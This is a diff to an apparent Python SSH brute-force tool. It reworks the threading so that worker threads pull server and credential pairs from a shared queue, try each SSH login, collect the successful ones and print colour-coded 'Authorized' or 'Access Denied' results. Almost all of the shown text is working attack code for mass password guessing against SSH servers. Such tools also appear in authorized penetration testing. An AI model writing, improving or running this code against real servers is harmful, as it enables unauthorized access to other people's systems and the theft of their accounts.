@@ -5,6 +5,7 @@ from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
 from threading import Thread, Lock
+from queue import Queue
 from time import strftime, localtime, time
 
 status_color = {
@@ -25,6 +26,7 @@ def get_arguments(*args):
     return parser.parse_args()[0]
 
 lock = Lock()
+queue = Queue()
 thread_count = 10
 successful_logins = []
 
@@ -52,30 +54,32 @@ def login(ssh_server, port, user, password):
     except Exception as err:
         t2 = time()
         return err, '', t2-t1
-def brute_force(thread_index, ssh_servers, port, credentials):
-    for credential in credentials:
-        for ssh_server in ssh_servers:
-            status = ['']
-            while status[0] != True and status[0] != False:
-                status = login(ssh_server, port, credential[0], credential[1])
-                if status[0] == True:
-                    with lock:
-                        successful_logins.append([ssh_server, credential, status[1]])
-                        display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
-                elif status[0] == False:
-                    with lock:
-                        display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
-                else:
-                    with lock:
-                        display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
-                    if ignore_errors:
-                        break
+def brute_force(thread_index, port):
+    while not queue.empty():
+        ssh_server, credential = queue.get()
+        status = ['']
+        while status[0] != True and status[0] != False:
+            status = login(ssh_server, port, credential[0], credential[1])
+            if status[0] == True:
+                with lock:
+                    successful_logins.append([ssh_server, credential, status[1]])
+                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
+            elif status[0] == False:
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+            else:
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                if ignore_errors:
+                    break
 def main(servers, port, credentials, threads_count):
     display('+', f"Starting {Back.MAGENTA}{threads_count} Brute Force Threads{Back.RESET}")
-    total_servers = len(servers)
+    for credential in credentials:
+        for server in servers:
+            queue.put([server, credential])
     threads = []
     for thread_index in range(threads_count):
-        threads.append(Thread(target=brute_force, args=(thread_index, servers[thread_index*total_servers//threads_count: (thread_index+1)*total_servers//threads_count], port, credentials)))
+        threads.append(Thread(target=brute_force, args=(thread_index, port, )))
         threads[-1].start()
     for thread in threads:
         thread.join()
